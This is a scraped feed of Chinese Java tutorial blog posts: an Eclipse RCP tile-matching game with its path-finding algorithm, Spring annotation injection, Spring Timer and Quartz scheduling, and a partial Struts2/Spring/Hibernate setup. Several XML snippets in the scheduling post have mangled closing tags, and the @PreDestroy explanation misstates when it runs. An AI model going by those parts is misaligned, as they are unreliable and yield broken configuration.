                //最后刷新显示
                canvas.redraw();
            }
            @Override
            public void mouseDoubleClick(MouseEvent arg0) {
                
            }
            @Override
            public void mouseUp(MouseEvent arg0) {
                
            }
        });
    }
    @Override
    public void setFocus() {
        // TODO Auto-generated method stub
    }
    public Canvas getCanvas() {
        return canvas;
    }
    public Spirit[][] getSpirits() {
        return spirits;
    }
    public List<Spirit> getLinkPath() {
        return linkPath;
    }
}
 3、GameAlgorithmUtil类的代码，算法的实现都在这里面了，有详细的注释：
package com.xkland.examples.rcp.javalinkgame;
import java.util.List;
import java.util.Random;
import org.eclipse.swt.graphics.Image;
import org.eclipse.ui.PlatformUI;
public class GameAlgorithmUtil {
    public static final int M = 9;
    public static final int N = 14;
    public static final int C = 7;
    
    private static Image[] normalImages = new Image[C];
    private static Image[] selectedImages = new Image[C];
    private static Image[] recommendedImages = new Image[C];
    private static boolean isImagesLoaded = false;
    
    private static void loadImages(Spirit[][] spirits){
        for (int i = 1; i <= C; i++) {
            normalImages[i-1] = new Image(PlatformUI.getWorkbench().getDisplay(),
                    spirits.getClass().getResourceAsStream("/images/0" + Integer.toString(i) + "o.png"));
            selectedImages[i-1] = new Image(PlatformUI.getWorkbench().getDisplay(), 
                    spirits.getClass().getResourceAsStream("/images/0" + Integer.toString(i) + "s.png"));
            recommendedImages[i-1] = new Image(PlatformUI.getWorkbench().getDisplay(), 
                    spirits.getClass().getResourceAsStream("/images/0" + Integer.toString(i) + "r.png"));
        }
    }
    
    public static void fillSpirits(Spirit[][] spirits){
        if(!isImagesLoaded){
            loadImages(spirits);
            isImagesLoaded = true;
        }
        for(int i=0; i<M; i++){
            for(int j=0; j<N; j++){
                int n = ((i-1)*(N-2) + (j-1)) % C;
                if(i==0 || i==M-1 || j==0 || j==N-1){
                    spirits[i][j] = new Spirit(null,null,null,0,i,j);
                }else{
                    spirits[i][j] = new Spirit(normalImages[n],selectedImages[n],recommendedImages[n],n+1,i,j);
                }
                
            }
        }
    }
    public static void shuffle(Spirit[][] spirits){
        //使用网上流传的随机抽牌和最后一张交换的洗牌算法，算法复杂度为O(n)
        Random rand = new Random();
        int count = (M-2)*(N-2);
        for(int i=M-2; i>=1; i--){
            for(int j=N-2; j>=1; j--){
                int n = rand.nextInt(count);
                Spirit temp = spirits[i][j];
                spirits[i][j] = spirits[n/(N-2)+1][n%(N-2)+1];
                spirits[n/(N-2)+1][n%(N-2)+1] = temp;
                //不仅要调整Spirit在数组中的位置，还要更改Spirit中自身保存的位置
                spirits[i][j].setPosition(i, j);
                spirits[n/(N-2)+1][n%(N-2)+1].setPosition(n/(N-2)+1, n%(N-2)+1);
            }
        }
    }
    
    //判断两个Spirit能否用一条线链接起来
    //如果能够用一条线链接起来，它们肯定在同一行或同一列
    private static boolean isLinkedByOneLine(Spirit[][] spirits, Spirit curSelect, Spirit oldSelect){
        boolean result = true;
        //如果curSelect和oldSelect在同一行
        if(curSelect.i == oldSelect.i){
            int p = curSelect.j > oldSelect.j ? oldSelect.j : curSelect.j;
            int q = curSelect.j > oldSelect.j ? curSelect.j : oldSelect.j;
            if (q - p == 1) return result;
            for (int j = p + 1; j < q; j++) {
                if (spirits[curSelect.i][j].imageId != 0)
                    result = false;
            }
        }
        //如果curSelect和oldSelect在同一列
        if(curSelect.j == oldSelect.j){
            int p = curSelect.i>oldSelect.i ? oldSelect.i : curSelect.i;
            int q = curSelect.i>oldSelect.i ? curSelect.i : oldSelect.i;
            if(q - p == 1) return result;
            for(int i = p+1; i<q; i++){
                if(spirits[i][curSelect.j].imageId != 0) result = false;
            }
        }
        //如果curSelect和oldSelect不再同一行同一列，当然不可能用一条线链接起来
        if(curSelect.i != oldSelect.i && curSelect.j != oldSelect.j){
            result = false;
        }
        return result;
    }
    
    //判断两个Spirit能否用两条线连接起来，如果能够用两条线链接起来，它们之间肯定只有一个中间结点
    //这个中间结点只能是spirits[curSelect.i][oldSelect.j]或者spirits[oldSelect.i][curSelect.j]
    //然后可以递归为分别判断这两个中间结点能不能用一条线和curSelect以及oldSelect链接起来
    //如果能，返回值为中间结点，如果不能，返回值为null
    private static Spirit isLinkedByTwoLine(Spirit[][] spirits, Spirit curSelect, Spirit oldSelect){
        if(isLinkedByOneLine(spirits, curSelect, spirits[curSelect.i][oldSelect.j]) 
                && isLinkedByOneLine(spirits, oldSelect, spirits[curSelect.i][oldSelect.j])
                && spirits[curSelect.i][oldSelect.j].imageId == 0){
            return spirits[curSelect.i][oldSelect.j];
        }
        if(isLinkedByOneLine(spirits, curSelect, spirits[oldSelect.i][curSelect.j]) 
                && isLinkedByOneLine(spirits, oldSelect, spirits[oldSelect.i][curSelect.j])
                && spirits[oldSelect.i][curSelect.j].imageId == 0){
            return spirits[oldSelect.i][curSelect.j];
        }
        return null;
    }
    
    //判断两个Spirit能否用三条线连接起来
    //可以递归为判断在curSelect的同一行或同一列的所有空元素能否用两条线和oldSelect连接起来
    //如果能，返回值为两个中间结点，如果不能，返回值为空
    private static Spirit[] isLinkedByThreeLine(Spirit[][] spirits, Spirit curSelect, Spirit oldSelect){
        Spirit[] nodes = new Spirit[2];
        //为了尽量找到短一点的路径，所以从curSelect和oldSelect的中间开始向上下左右四个方向分别扫描
        //向上
        for(int i=(curSelect.i+oldSelect.i)/2; i>=0; i--){
            nodes[0] = spirits[i][curSelect.j];
            nodes[1] = isLinkedByTwoLine(spirits, nodes[0], oldSelect);
            if(isLinkedByOneLine(spirits, curSelect, nodes[0])
                    && nodes[1] != null && nodes[0].imageId == 0){
                return nodes;
            }
        }
        //向下
        for(int i=(curSelect.i+oldSelect.i)/2; i<M; i++){
            nodes[0] = spirits[i][curSelect.j];
            nodes[1] = isLinkedByTwoLine(spirits, nodes[0], oldSelect);
            if(isLinkedByOneLine(spirits, curSelect, nodes[0])
                    && nodes[1] != null && nodes[0].imageId == 0){
                return nodes;
            }
        }
        //向左
        for(int j=(curSelect.j+oldSelect.j)/2; j>=0; j--){
            nodes[0] = spirits[curSelect.i][j];
            nodes[1] = isLinkedByTwoLine(spirits, nodes[0], oldSelect);
            if(isLinkedByOneLine(spirits, curSelect, nodes[0])
                    && nodes[1] != null && nodes[0].imageId == 0){
                return nodes;
            }
        }
        //向右
        for(int j=(curSelect.j+oldSelect.j)/2; j<N; j++){
            nodes[0] = spirits[curSelect.i][j];
            nodes[1] = isLinkedByTwoLine(spirits, nodes[0], oldSelect);
            if(isLinkedByOneLine(spirits, curSelect, nodes[0])
                    && nodes[1] != null && nodes[0].imageId == 0){
                return nodes;
            }
        }
        return null;
    }
    
    public static boolean findPath(Spirit[][] spirits,Spirit curSelect, Spirit oldSelect, List<Spirit> path){
        //情况一，两个Spirit能用一条线连接起来
        if(isLinkedByOneLine(spirits, curSelect, oldSelect)){
            path.add(curSelect);
            path.add(oldSelect);
            return true;
        }
        
        //情况二，两个Spirit能用两条线连接起来
        Spirit temp = isLinkedByTwoLine(spirits, curSelect, oldSelect);
        if(temp != null){
            path.add(curSelect);
            path.add(temp);
            path.add(oldSelect);
            return true;
        }
        
        //情况三，两个Spirit能用三条线连接起来
        Spirit[] temps = isLinkedByThreeLine(spirits, curSelect, oldSelect);
        if(temps != null){
            path.add(curSelect);
            path.add(temps[0]);
            path.add(temps[1]);
            path.add(oldSelect);
            return true;
        }
        
        return false;
    }
}
 上面三个就是这个游戏的主要实现了。另外三个代码如下： 4、plugin.xml，就只定义了一个视图，两个Command及其menuContributions和Handler：
<?xml version="1.0" encoding="UTF-8"?>
<?eclipse version="3.4"?>
<plugin>
   <extension
         id="application"
         point="org.eclipse.core.runtime.applications">
      <application>
         <run
               class="com.xkland.examples.rcp.javalinkgame.Application">
         </run>
      </application>
   </extension>
   <extension
         point="org.eclipse.ui.perspectives">
      <perspective
            name="RCP Perspective"
            class="com.xkland.examples.rcp.javalinkgame.Perspective"
            id="com.xkland.examples.rcp.javalinkgame.perspective">
      </perspective>
   </extension>
   <extension
         point="org.eclipse.ui.views">
      <view
            class="com.xkland.examples.rcp.javalinkgame.GameView"
            id="JavaLinkGame.views.game"
            name="Game View"
            restorable="true">
      </view>
   </extension>
   <extension
         point="org.eclipse.ui.perspectiveExtensions">
      <perspectiveExtension
            targetID="*">
         <view
               id="JavaLinkGame.views.game"
               minimized="false"
               relationship="left"
               relative="org.eclipse.ui.editorss">
         </view>
      </perspectiveExtension>
   </extension>
   <extension
         point="org.eclipse.ui.commands">
      <command
            id="JavaLinkGame.commands.startGame"
            name="Start Game">
      </command>
      <command
            id="JavaLinkGame.commands.search"
            name="Search">
      </command>
   </extension>
   <extension
         point="org.eclipse.ui.menus">
      <menuContribution
            allPopups="false"
            locationURI="toolbar:JavaLinkGame.views.game">
         <command
               commandId="JavaLinkGame.commands.startGame"
               icon="icons/StartIcon.png"
               style="push"
               tooltip="开始游戏">
         </command>
         <command
               commandId="JavaLinkGame.commands.search"
               icon="icons/SearchIcon.png"
               style="push"
               tooltip="给点提示">
         </command>
      </menuContribution>
   </extension>
   <extension
         point="org.eclipse.ui.handlers">
      <handler
            class="com.xkland.examples.rcp.javalinkgame.GameStartHandler"
            commandId="JavaLinkGame.commands.startGame">
      </handler>
      <handler
            class="com.xkland.examples.rcp.javalinkgame.SpiritSearchHandler"
            commandId="JavaLinkGame.commands.search">
      </handler>
   </extension>
</plugin>
 5、GameStartHandler类的代码，点击工具栏左边那个带旗子的图标，开始游戏：
package com.xkland.examples.rcp.javalinkgame;
import org.eclipse.core.commands.AbstractHandler;
import org.eclipse.core.commands.ExecutionEvent;
import org.eclipse.core.commands.ExecutionException;
import org.eclipse.ui.PlatformUI;
public class GameStartHandler extends AbstractHandler {
    @Override
    public Object execute(ExecutionEvent event) throws ExecutionException {
        GameView view = (GameView)PlatformUI.getWorkbench().getActiveWorkbenchWindow().getActivePage()
                .findView("JavaLinkGame.views.game");
        GameAlgorithmUtil.fillSpirits(view.getSpirits());
        GameAlgorithmUtil.shuffle(view.getSpirits());
        view.getCanvas().redraw();
        return null;
    }
}
 6、SpiritSearchHandler类的代码，也就是点击右边那个放大镜图标时，自动寻找一对能够连通的方块：
package com.xkland.examples.rcp.javalinkgame;
import java.util.LinkedList;
import org.eclipse.core.commands.AbstractHandler;
import org.eclipse.core.commands.ExecutionEvent;
import org.eclipse.core.commands.ExecutionException;
import org.eclipse.ui.PlatformUI;
public class SpiritSearchHandler extends AbstractHandler {
    @Override
    public Object execute(ExecutionEvent event) throws ExecutionException {
        GameView view = (GameView)PlatformUI.getWorkbench().getActiveWorkbenchWindow().getActivePage()
                .findView("JavaLinkGame.views.game");
        Spirit[][] spirits = view.getSpirits();
        Spirit first;
        Spirit second;
        for(int i=0; i<GameAlgorithmUtil.M; i++){
            for(int j=0; j<GameAlgorithmUtil.N; j++){
                first = spirits[i][j];
                //再用两层循环找second
                for(int m=0; m<GameAlgorithmUtil.M; m++){
                    for(int n=0; n<GameAlgorithmUtil.N; n++){
                        second = spirits[m][n];
                        //如果first和second之间有路径相连，则推荐它们
                        if(first.imageId != 0 && second.imageId != 0 && first != second
                                && first.imageId == second.imageId
                                && GameAlgorithmUtil.findPath(spirits, first, second, new LinkedList<Spirit>())){
                            first.recommend();
                            second.recommend();
                            view.getCanvas().redraw();
                            return null;
                        }
                    }
                }
            }
        }
        return null;
    }
}
 完整的项目压缩文件如下：JavaLinkGame.zip 该项目是在Ubuntu下写的，下载后使用Eclipse可以直接导入。如果是在Windows下使用的话，一定记得在项目的属性中将字符编码改成UTF-8，换行风格改成Unix风格。否则出现乱码。 在Windows 7中运行的截图： 　　该游戏在Ubuntu中运行很流畅，但是在Windows7有点闪烁，要解决这个问题需要用到double buffer。另外，由于不想增加额外的复杂性，我没有使用多线程，所以方块的消除是在下一次点击鼠标时完成的，用户体验略差。 　　如果想用多线程，就得更改程序的结构，不能直接在MouseListener中处理鼠标点击事件，而是应该另外建立一个队列，将所有的操作，包括定时器到期的操作，都发送到队列中，然后在队列另一端使用一个消费者消费这些事件。由于我不是在讲并发编程，这里就不详细展开了。我以前用MFC做了一个俄罗斯方块小游戏，就是把所有的操作都发送到队列中，大家可以参考，博客在这里： 写个小游戏练一练手
相关资料
Eclipse RCP详解（01）：Hello World以及Eclipse RCP和OSGi的简单展示
Eclipse RCP详解（02）：Eclipse的Runtime和UI初探
 
官方验证：
项目截图：
运行时需要用Run As ..Eclipse Application,但是没有运行成功，估计是和我本地的jdk7有关
java.lang.UnsatisfiedLinkError: Cannot load 32-bit SWT libraries on 64-bit JVM
大家有谁验证过的可以提供下说明。 
已有 4 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Spring AOP注解通过@Autowired，@Resource，@Qualifier，@PostConstruct，@PreDestroy注入属性的配置文, lizhuangs.iteye.com.blog.2059170, Fri, 02 May 2014 09:40:41 +0800

原创整理不易，转载请注明出处：Spring AOP注解通过@Autowired，@Resource，@Qualifier，@PostConstruct，@PreDestroy注入属性的配置文件详解
代码下载地址：http://www.zuidaima.com/share/1772661373422592.htm
本文介绍了使用Spring注解注入属性的方法。使用注解以前，注入属性通过类以及配置文件来实现。现在，注入属性可以通过引入@Autowired注解，或者@Resource，@Qualifier，@PostConstruct，@PreDestroy等注解来实现。
1.1. 使用注解以前我们是怎样注入属性的
类的实现：
public class UserManagerImpl implements UserManager {     
    private UserDao userDao;     
    public void setUserDao(UserDao userDao) {     
        this.userDao = userDao;     
    }     
    ...     
} 
配置文件：
<bean id="userManagerImpl" class="com.kedacom.spring.annotation.service.UserManagerImpl"> 
    <property name="userDao" ref="userDao" /> 
</bean> 
<bean id="userDao" class="com.kedacom.spring.annotation.persistence.UserDaoImpl"> 
    <property name="sessionFactory" ref="mySessionFactory" /> 
</bean>   
1.2. 引入@Autowired注解（不推荐使用，建议使用@Resource）
类的实现（对成员变量进行标注）
public class UserManagerImpl implements UserManager {  
    @Autowired 
    private UserDao userDao;  
    ...  
}  
或者（对方法进行标注）
public class UserManagerImpl implements UserManager {  
    private UserDao userDao;  
    @Autowired 
    public void setUserDao(UserDao userDao) {  
        this.userDao = userDao;  
    }  
    ...  
} 
配置文件
<bean id="userManagerImpl" class="com.kedacom.spring.annotation.service.UserManagerImpl" /> 
<bean id="userDao" class="com.kedacom.spring.annotation.persistence.UserDaoImpl"> 
    <property name="sessionFactory" ref="mySessionFactory" /> 
</bean> 
@Autowired可以对成员变量、方法和构造函数进行标注，来完成自动装配的工作。以上两种不同实现方式中，@Autowired的标注位置不同，它们都会在Spring在初始化userManagerImpl这个bean时，自动装配userDao这个属性，区别是：第一种实现中，Spring会直接将UserDao类型的唯一一个bean赋值给userDao这个成员变量；第二种实现中，Spring会调用 setUserDao方法来将UserDao类型的唯一一个bean装配到userDao这个属性。
1.3. 让@Autowired工作起来
要使@Autowired能够工作，还需要在配置文件中加入以下代码
<bean class="org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor" />   
1.4. @Qualifier
@Autowired是根据类型进行自动装配的。在上面的例子中，如果当Spring上下文中存在不止一个UserDao类型的bean时，就会抛出BeanCreationException异常；如果Spring上下文中不存在UserDao类型的bean，也会抛出 BeanCreationException异常。我们可以使用@Qualifier配合@Autowired来解决这些问题。
a. 可能存在多个UserDao实例
@Autowired 
public void setUserDao(@Qualifier("userDao") UserDao userDao) {  
    this.userDao = userDao;  
}  
这样，Spring会找到id为userDao的bean进行装配。
b. 可能不存在UserDao实例
@Autowired(required = false)  
public void setUserDao(UserDao userDao) {  
    this.userDao = userDao;  
}   
1.5. @Resource（JSR-250标准注解，推荐使用它来代替Spring专有的@Autowired注解）
Spring 不但支持自己定义的@Autowired注解，还支持几个由JSR-250规范定义的注解，它们分别是@Resource、@PostConstruct以及@PreDestroy。
@Resource的作用相当于@Autowired，只不过@Autowired按byType自动注入，而@Resource默认按 byName自动注入罢了。@Resource有两个属性是比较重要的，分别是name和type，Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不指定name也不指定type属性，这时将通过反射机制使用byName自动注入策略。
@Resource装配顺序 1. 如果同时指定了name和type，则从Spring上下文中找到唯一匹配的bean进行装配，找不到则抛出异常 2. 如果指定了name，则从上下文中查找名称（id）匹配的bean进行装配，找不到则抛出异常 3. 如果指定了type，则从上下文中找到类型匹配的唯一bean进行装配，找不到或者找到多个，都会抛出异常 4. 如果既没有指定name，又没有指定type，则自动按照byName方式进行装配（见2）；如果没有匹配，则回退为一个原始类型（UserDao）进行匹配，如果匹配则自动装配；
1.6. @PostConstruct（JSR-250）
在方法上加上注解@PostConstruct，这个方法就会在Bean初始化之后被Spring容器执行（注：Bean初始化包括，实例化Bean，并装配Bean的属性（依赖注入））。
它的一个典型的应用场景是，当你需要往Bean里注入一个其父类中定义的属性，而你又无法复写父类的属性或属性的setter方法时，如：
public class UserDaoImpl extends HibernateDaoSupport implements UserDao {  
    private SessionFactory mySessionFacotry;  
    @Resource 
    public void setMySessionFacotry(SessionFactory sessionFacotry) {  
        this.mySessionFacotry = sessionFacotry;  
    }  
    @PostConstruct 
    public void injectSessionFactory() {  
        super.setSessionFactory(mySessionFacotry);  
    }  
    ...  
}   
这里通过@PostConstruct，为UserDaoImpl的父类里定义的一个sessionFactory私有属性，注入了我们自己定义的sessionFactory（父类的setSessionFactory方法为final，不可复写），之后我们就可以通过调用 super.getSessionFactory()来访问该属性了。
1.7. @PreDestroy（JSR-250）
在方法上加上注解@PreDestroy，这个方法就会在Bean初始化之后被Spring容器执行。由于我们当前还没有需要用到它的场景，这里不不去演示。其用法同@PostConstruct。
1.8. 使用< context:annotation-config />简化配置
Spring2.1添加了一个新的context的Schema命名空间，该命名空间对注释驱动、属性文件引入、加载期织入等功能提供了便捷的配置。我们知道注释本身是不会做任何事情的，它仅提供元数据信息。要使元数据信息真正起作用，必须让负责处理这些元数据的处理器工作起来。
AutowiredAnnotationBeanPostProcessor和 CommonAnnotationBeanPostProcessor就是处理这些注释元数据的处理器。但是直接在Spring配置文件中定义这些 Bean显得比较笨拙。Spring为我们提供了一种方便的注册这些BeanPostProcessor的方式，这就是< context:annotation-config />：
<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" 
    xsi:schemaLocation="http://www.springframework.org/schema/beans  
    http://www.springframework.org/schema/beans/spring-beans-2.5.xsd  
    http://www.springframework.org/schema/context  
    http://www.springframework.org/schema/context/spring-context-2.5.xsd"> 
    < context:annotation-config /> 
</beans>   
<context:annotationconfig />将隐式地向Spring容器注册AutowiredAnnotationBeanPostProcessor、 CommonAnnotationBeanPostProcessor、 PersistenceAnnotationBeanPostProcessor以及 RequiredAnnotationBeanPostProcessor这4个BeanPostProcessor。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Spring定时器配置的两种实现方式OpenSymphony Quartz和java Timer详解, lizhuangs.iteye.com.blog.2059054, Thu, 01 May 2014 11:04:46 +0800

原创整理不易，转载请注明出处：Spring定时器配置的两种实现方式OpenSymphony Quartz和java Timer详解
代码下载地址：http://www.zuidaima.com/share/1772648445103104.htm
有两种流行Spring定时器配置：Java的Timer类和OpenSymphony的Quartz。
1.Java Timer定时
首先继承java.util.TimerTask类实现run方法
import java.util.TimerTask;   
public class EmailReportTask extends TimerTask{   
    @Override   
    public void run() {   
        ...   
    }     
}   
在Spring定义
... 
配置Spring定时器
<bean id="scheduleReportTask" class="org.springframework.scheduling.timer.ScheduledTimerTask">   
<property name="timerTask" ref="reportTimerTask" />   
<property name="period">   
<value>86400000</value>   
</property>   
</bean>   
timerTask属性告诉ScheduledTimerTask运行哪个。86400000代表24个小时
启动Spring定时器
Spring的TimerFactoryBean负责启动定时任务
<bean class="org.springframework.scheduling.timer.TimerFactoryBean">   
<property name="scheduledTimerTasks">   
   <list><ref bean="scheduleReportTask"/>list>   
property>   
bean>   
scheduledTimerTasks里显示一个需要启动的定时器任务的列表。   
可以通过设置delay属性延迟启动   
<bean id="scheduleReportTask" class="org.springframework.scheduling.timer.ScheduledTimerTask">   
<property name="timerTask" ref="reportTimerTask" />   
<property name="period">   
<value>86400000value>   
property>   
<property name="delay">   
<value>3600000value>   
</property>   
</bean>   
这个任务我们只能规定每隔24小时运行一次，无法精确到某时启动
2.Quartz定时器
首先继承QuartzJobBean类实现executeInternal方法
import org.quartz.JobExecutionContext;   
import org.quartz.JobExecutionException;   
import org.springframework.scheduling.quartz.QuartzJobBean;   
 
public class EmailReportJob extends QuartzJobBean{   
protected void executeInternal(JobExecutionContext arg0)   
throws JobExecutionException {   
...   
}   
}   
在Spring中定义
<bean id="reportJob" class="org.springframework.scheduling.quartz.JobDetailBean">   
<property name="jobClass">   
<value>EmailReportJobvalue>   
property>   
<property name="jobDataAsMap">   
    <map>   
        <entry key="courseService">   
            <ref bean="courseService"/>   
            entry>   
    </map>   
</property>   
</bean>   
在这里我们并没有直接声明一个EmailReportJob Bean，而是声明了一个JobDetailBean。这个是Quartz的特点。JobDetailBean是Quartz的org.quartz.JobDetail的子类，它要求通过jobClass属性来设置一个Job对象。
使用Quartz的JobDetail中的另一个特别之处是EmailReportJob的courseService属性是间接设置的。JobDetail的jobDataAsMap属性接受一个Map，包括设置给jobClass的各种属性，当。JobDetailBean实例化时，它会将courseService Bean注入到EmailReportJob 的courseService 属性中。
启动定时器
Quartz的org.quartz.Trigger类描述了何时及以怎样的频度运行一个Quartz工作。Spring提供了两个触发器SimpleTriggerBean和CronTriggerBean。  SimpleTriggerBean与scheduledTimerTasks类似。指定工作的执行频度，模仿scheduledTimerTasks配置 .
<bean id="simpleReportTrigger" class="org.springframework.scheduling.quartz.SimpleTriggerBean">   
<property name="jobDetail" ref="reprotJob" />   
<property name="startDelay">   
<value>360000value>   
property>   
<property name="repeatInterval">   
    <value>86400000value>   
</property>   
</bean> 
startDelay也是延迟1个小时启动
CronTriggerBean指定工作的准确运行时间
<bean id="cronReportTrigger" class="org.springframework.scheduling.quartz.CronTriggerBean">   
<property name="jobDetail" ref="reprotJob" />   
<property name="cronExpression">   
<value>0 0 6 * * ?value>   
</property>   
</bean>   
属性cronExpression告诉何时触发。最神秘就是cron表达式： Linux系统的计划任务通常有cron来承担。一个cron表达式有至少6个（也可能7个）有空格分隔的时间元素。从左到右： 1.秒2.分3.小时4.月份中的日期（1-31）5.月份（1-12或JAN-DEC)6.星期中的日期（1-7或SUN-SAT）7.年份（1970-2099）  每个元素都显示的规定一个值（如6），一个区间（9-12），一个列表（9，11，13）或一个通配符（*）。因为4和6这两个元素是互斥的，因此应该通过设置一个问号（？）来表明不想设置的那个字段，“/”如果值组合就表示重复次数（10/6表示每10秒重复6次）。
启动定时器
<bean class="org.springframework.scheduling.quartz.SchedulerFactoryBean">   
    <property name="triggers">   
       <list><ref bean="cronReportTrigger"/>list>   
    </property>   
</bean>   
triggers属性接受一组触发器。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
ssh框架搭建Struts2.06+spring2.5+hibernate3.2整合实例代码教程步骤, lizhuangs.iteye.com.blog.2058775, Wed, 30 Apr 2014 10:29:52 +0800

原创整理不易，转载请注明出处：ssh框架搭建Struts2.06+spring2.5+hibernate3.2整合实例代码教程步骤
代码下载地址：http://www.zuidaima.com/share/1760074977233920.htm
最近闲来无事可做，于是开始学习struts2。Struts2和struts1、webwork2有什么区别我也不说了，网上有很多这方面的资料。以前在项目中从未使用过struts，一直使用spring+hibernate，现在既然学习了Struts，也不能浪费，于是乎开始琢磨着怎么整合这3个框架。整合原理以spring为容器，管理hibernate的DAO和Struts2的Action。 一、 准备工作 Struts2.06+spring2.5+hibernate3.2+jdk6.0+myeclipse6.0+tomcat5.5+mysql5.0 以上是整合的原料。下面以一个注册登陆的例子来开始我们的整合过程。 这个例子很简单，下面是它的sql脚本内容:
CREATE TABLE `zuidaima_user` (
  `userid` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(20) NOT NULL,
  `password` varchar(16) NOT NULL,
  `email` varchar(30) NOT NULL,
  PRIMARY KEY (`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf-8;
 二、 开始行动 包结构可以参考下图   图一  图二 图三 1) Struts部分:建立struts.xml和struts.properties Struts.xml内容如下：
 <? xml version="1.0" encoding="UTF-8" ?>
 <! DOCTYPE struts PUBLIC "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN" "http://struts.apache.org/dtds/struts-2.0.dtd" >
 <struts>
     <package  name ="user_curd"  extends ="struts-default"  >
         <global-results>
             <!--  下面定义的结果对所有的Action都有效  -->
             <result  name ="exception"> /error.jsp </result>
         </global-results>
         <global-exception-mappings>
             <!--  指Action抛出Exception异常时，转入名为exception的结果。  -->
             <exception-mapping  exception ="java.lang.Exception"  result ="exception" />
         </global-exception-mappings>
         <action  name ="Login"  class ="LoginAction">
             <result  name ="success"> /success.jsp </result>     
             <result  name ="input"> /login.jsp </result>
         </action>
         <action  name ="Regist"  class ="RegistAction">
             <result  name ="success"> /success.jsp </result>     
             <result  name ="input"> /regist.jsp </result>
         </action>
     </package>  
 </struts>
 Struts.properties内容如下:
struts.devMode = false
struts.enable.DynamicMethodInvocation = true
struts.i18n.reload = true
struts.ui.theme =xhtml
struts.locale = zh_CN
struts.i18n.encoding = UTF- 8
struts.objectFactory = spring
struts.objectFactory.spring.autoWire = name
struts.serve.static.browserCache = false
struts.url.includeParams = none
 2) 建立User.java和User.hbm.xml、jdbc.properties： User.java内容如下:
/** 
 * 
 * @author <a href="mailto:flustar2008@163.com">flustar</a>
 * @version 1.0 
 * Creation date: Dec 23, 2007 1:55:28 PM
 */
package com.firstssh.model;
import java.io.Serializable;
public class User implements Serializable {
    private int id;
    private String username;
    private String password;
    private String email;
    public int getId() {
        return id;
    }
    public void setId(int id) {
        this.id = id;
    }
    public String getUsername() {
        return username;
    }
    public void setUsername(String username) {
        this.username = username;
    }
    public String getPassword() {
        return password;
    }
    public void setPassword(String password) {
        this.password = password;
    }
    public String getEmail() {
        return email;
    }
    public void setEmail(String email) {
        this.email = email;
    }
}
 User.hbm.xml内容:
<?xml version="1.0"?>
<!DOCTYPE hibernate-mapping PUBLIC 
    "-//Hibernate/Hibernate Mapping DTD 3.0//EN"
    "http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd">
<hibernate-mapping 
    package="com.firstssh.model">
    <class name="User" table="User">
        <id name="id" column="userid">
            <generator class="identity" />
        </id>    
        <property name="username"
                  column="username"
                  not-null="true"
                  length="20"
        />
        <property name="password"
                  column="password"
                  not-null="true"
                  length="16" />
        <property name="email"
                  column="email"
                  not-null="true"
                  length="30"/>
    </class>
    
</hibernate-mapping>
 jdbc.properties内容如下:
datasource.type = mysql
datasource.driverClassName = com.mysql.jdbc.Driver
datasource.url = jdbc:mysql://localhost: 3306 /test?useUnicode = true&characterEncoding = UTF- 8
datasource.username = root
datasource.password = 123456
datasource.maxActive = 10
datasource.maxIdle = 2
datasource.maxWait = 120000
datasource.whenExhaustedAction = 1
datasource.validationQuery = select  1  from dual
datasource.testOnBorrow = true
datasource.testOnReturn = false
c3p0.acquireIncrement = 3
c3p0.initialPoolSize = 3
c3p0.idleConnectionTestPeriod = 900
c3p0.minPoolSize = 2
c3p0.maxPoolSize = 50
c3p0.maxStatements = 100
c3p0.numHelperThreads = 10
c3p0.maxIdleTime = 600
hibernate.dialect = org.hibernate.dialect.MySQLInnoDBDialect
#hibernate.dialect = org.hibernate.dialect.MySQLMyISAMDialect
hibernate.jdbc.batch_size = 25
hibernate.jdbc.fetch_size = 50
hibernate.show_sql = true
hibernate.connection.release_mode = after_transaction
 3) Spirng部分:为了清晰把Spring的配置文件拆分成以下几部分applicationContext-dao.xml、appliationContext-service.xml、applicationContext-hibernate.xml、action-servlet.xml。 applicationContext-hibernate.xml内容：
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN 2.0//EN" "http://www.springframework.org/dtd/spring-beans-2.0.dtd">
<beans>
<bean id="propertyConfigurer"
    class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer">
    <property name="locations">
        <list>
            <!--  <value>WEB-INF/mail.properties</value>-->
            <value>WEB-INF/jdbc.properties</value>
            <!--  <value>WEB-INF/oscache.properties</value>-->
        </list>
    </property>
</bean>
<!-- MailSender used by EmailAdvice -->
<!--
    <bean id="mailSender" class="org.springframework.mail.javamail.JavaMailSenderImpl">
    <property name="host" value="${mail.host}"/>
    </bean>
-->
<bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource"
    destroy-method="close" dependency-check="none">
    <property name="driverClass">
        <value>${datasource.driverClassName}</value>
    </property>
    <property name="jdbcUrl">
        <value>${datasource.url}</value>
    </property>
    <property name="user">
        <value>${datasource.username}</value>
    </property>
    <property name="password">
        <value>${datasource.password}</value>
    </property>
    <property name="acquireIncrement">
        <value>${c3p0.acquireIncrement}</value>
    </property>
    <property name="initialPoolSize">
        <value>${c3p0.initialPoolSize}</value>
    </property>
    <property name="minPoolSize">
        <value>${c3p0.minPoolSize}</value>
    </property>
    <property name="maxPoolSize">
        <value>${c3p0.maxPoolSize}</value>
    </property>
    <property name="maxIdleTime">
        <value>${c3p0.maxIdleTime}</value>
    </property>
    <property name="idleConnectionTestPeriod">
        <value>${c3p0.idleConnectionTestPeriod}</value>
    </property>
    <property name="maxStatements">
        <value>${c3p0.maxStatements}</value>
    </property>
    <property name="numHelperThreads">
        <value>${c3p0.numHelperThreads}</value>
    </property>
</bean>
<bean id="sessionFactory"
